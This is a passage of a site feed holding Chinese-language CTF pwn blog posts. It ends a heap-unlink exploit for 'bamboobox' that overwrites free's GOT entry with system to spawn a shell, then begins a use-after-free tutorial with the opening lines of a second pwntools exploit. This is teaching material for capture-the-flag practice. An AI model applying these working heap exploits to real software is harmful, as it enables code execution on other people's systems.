comment\"># r = remote('node4.buuoj.cn',25461)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./bamboobox')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./bamboobox'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./bamboobox'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add_item</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the length of item name:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the name of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the index of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the length of item name:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the new name of the item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the index of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice:'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># To stop merging chunk</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>ptr<span class=\"token operator\">=</span><span class=\"token number\">0x6020c8</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>fd<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>bk<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>bk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>fake_chunk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>free_got<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"free_got:%x\"</span><span class=\"token punctuation\">,</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>free_addr<span class=\"token operator\">=</span>lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"free_addr:%x\"</span><span class=\"token operator\">%</span>free_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">,</span>free_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>libc_base<span class=\"token operator\">=</span>free_addr<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_addr:%x\"</span><span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>system_addr<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system_addr:%x\"</span><span class=\"token punctuation\">,</span>system_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#改写 got 表内容</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/unlinkpic/image-20230811135415349.png\" alt=\"image-20230811135415349\"></p>\n<h3 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结：</h3>\n<p>unlink 这里比较的绕，其实不难，但是是去理解指针的指向需要花费一点时间，现在还是不太熟练，要继续加油。</p>\n",
            "tags": [
                "堆",
                "unlink"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/10/uaf/",
            "url": "https://yhuanhuan01.github.io/2023/08/10/uaf/",
            "title": "uaf",
            "date_published": "2023-08-10T01:18:39.000Z",
            "content_html": "<h1 id=\"pwn-uaf了解学习\"><a class=\"markdownIt-Anchor\" href=\"#pwn-uaf了解学习\">#</a> PWN uaf 了解学习</h1>\n<p>刚刚接触堆，发现在看题的时候，对与 C 语言要求还挺高，需要了解指针是怎么一回事。所以我决定，下面一道例题要好好分析源代码，了解各个函数调用的意义。</p>\n<h2 id=\"首先先声明一下什么叫uaf\"><a class=\"markdownIt-Anchor\" href=\"#首先先声明一下什么叫uaf\">#</a> 首先先声明一下什么叫 uaf：</h2>\n<p>参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91c2UtYWZ0ZXItZnJlZS8=\"> ctfwiki</span></p>\n<p>原理 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91c2UtYWZ0ZXItZnJlZS8jXzE=\">¶</span></p>\n<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>\n<ul>\n<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>\n<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>\n<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>\n</ul>\n<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p>\n<p><em>通过了解了原理，我们发现 uaf 是由于使用后再次 free 没有去置空指针，导致下一次被使用程序会再次到指针所指向的内容。</em></p>\n<p>接下来我们通过一道例题去了解一下 uaf 漏洞的利用。</p>\n<h3 id=\"题目来源\"><a class=\"markdownIt-Anchor\" href=\"#题目来源\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2FjdGZfMjAxOV9iYWJ5aGVhcA==\">题目来源</span></h3>\n<h4 id=\"首先检查程序保护措施\"><a class=\"markdownIt-Anchor\" href=\"#首先检查程序保护措施\">#</a> 首先检查程序保护措施：</h4>\n<p><img data-src=\"/img/uafpic/image-20230810073539360.png\" alt=\"image-20230810073539360\"></p>\n<p>哦，对了。这里为啥 runpath 的路径是我本地的原因是，我用 patchelf 改了，将他变成 ubuntu16.04 版本的 glibc，为了去了解一下 fastbins 的作用（其实不用改也可以，在调试 18.04 的 glibc 版本，发现其实变化不大。</p>\n<h4 id=\"运行程序去了解功能\"><a class=\"markdownIt-Anchor\" href=\"#运行程序去了解功能\">#</a> 运行程序，去了解功能：</h4>\n<p>运行程序，发现 menu，有 4 个 node。</p>\n<p><img data-src=\"/img/uafpic/image-20230810073909996.png\" alt=\"image-20230810073909996\"></p>\n<ol>\n<li>选择 Create something</li>\n</ol>\n<p><img data-src=\"/img/uafpic/image-20230810074007769.png\" alt=\"image-20230810074007769\"></p>\n<ol start=\"2\">\n<li>选择 Print something</li>\n</ol>\n<p><img data-src=\"/img/uafpic/image-20230810074030177.png\" alt=\"image-20230810074030177\"></p>\n<ol start=\"3\">\n<li>选择 Delete something, 之后在 Print something</li>\n</ol>\n<p><img data-src=\"/img/uafpic/image-20230810074149061.png\" alt=\"image-20230810074149061\"></p>\n<p>这也就是这程序的主要功能了。</p>\n<h4 id=\"放入ida进行函数分析\"><a class=\"markdownIt-Anchor\" href=\"#放入ida进行函数分析\">#</a> 放入 IDA，进行函数分析：</h4>\n<blockquote>\n<ul>\n<li>\n<p>main 函数:</p>\n<p>没什么好讲的，主要是去调用函数功能。</p>\n</li>\n</ul>\n<p><img data-src=\"/img/uafpic/image-20230810075032398.png\" alt=\"image-20230810075032398\"></p>\n</blockquote>\n<blockquote>\n<ul>\n<li>\n<p>add 函数：</p>\n<p>这一个 node 可以看见会申请两次堆空间，第一次是 0x10 的，第二次是我们输入的</p>\n</li>\n</ul>\n<p><img data-src=\"/img/uafpic/image-20230810080910781.png\" alt=\"image-20230810080910781\"></p>\n<p><img data-src=\"/img/uafpic/image-20230810081834751.png\" alt=\"image-20230810081834751\"></p>\n<p>这就是 add 后的 chunk，但是为啥第一个块内存有个地方我没标注内容，因为我暂时不知道。但是我后期调试发现应该是字符串的地址。</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>\n<p>delete 函数：</p>\n<p>delete 会根据给定的索引来释放对应的 note。但是值得注意的是，在删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。</p>\n</li>\n</ul>\n<p><img data-src=\"/img/uafpic/image-20230810083828105.png\" alt=\"image-20230810083828105\"></p>\n<p><img data-src=\"/img/uafpic/image-20230810084236274.png\" alt=\"image-20230810084236274\"></p>\n<p><img data-src=\"/img/uafpic/image-20230810084217308.png\" alt=\"image-20230810084217308\"></p>\n<p>所以这里我们利用 uaf，去申请 0x10 大小的空间，去覆写堆的指针即可（为何去申请 0x10 呢，我的理解就是，去申请 fastbins 里面相同大小的 chunk，便于再次利用指针的作用，从而控制程序的控制流。）</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>\n<p>show 函数：</p>\n<p>这里面唯一的重点就是那个注释，因为通过这里，去执行这个函数，就能实现控制。比如 ptr [1] 处是 system 函数的地址，prt [[0] 处是 binsh 字符串的地址，那我们就能实现 system (’/bin/sh’) 的作用。</p>\n<p><img data-src=\"/img/uafpic/image-20230810085041491.png\" alt=\"image-20230810085041491\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>接下来是漏洞利用过程：<br>\n申请 note0（大小为 0x40）：包括 put0 和 content0<br>\n 申请 note1 (大小为 0x40) ：包括 put1 和 content1<br>\n 释放 note0：包括 free content0 和 free put0<br>\n 释放 note1：包括 free content1 和 free put1</p>\n</blockquote>\n<p>由于 put 段跟 content 段的大小是不同的，所以他们是在 bin 里面是两条链：如果你申请的 chunk 大小是 0x10，那么是从 put 的那条链申请。如果你申请的 chunk 大小是 0x20，那么就是从 content 的那条链申请。</p>\n<p>所以我们再次申请要去申请 0x10 大小</p>\n<p>申请 note2（大小为 0x10）：则会申请一个 put2 一个 content2. 由于 put2 和 content2 大小都为 0x10，所以都会从 put 那条链上面申请。<br>\n所以，put2 申请到的是 put0 的位置，content2 申请到的是 put1 的位置。</p>\n<p>很明显了，我们往 content2 里面填入 system 的地址和 binsh 地址，不就相当于往 note0 的 put0 里填入了 system 和 binsh？<br>\n那么我们在调用 show (0) 的时候，不就是调用了 system 函数吗？</p>\n<blockquote>\n<p>为了更加高效地利用 fast bin，glibc 采用单向链表对其中的每个 bin 进行组织，并且<strong>每个 bin 采取 LIFO 策略</strong></p>\n</blockquote>\n<h4 id=\"所以exp为\"><a class=\"markdownIt-Anchor\" href=\"#所以exp为\">#</a> 所以 exp 为：</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29844</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./bheap')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = process('./bheap')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./bheap'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span 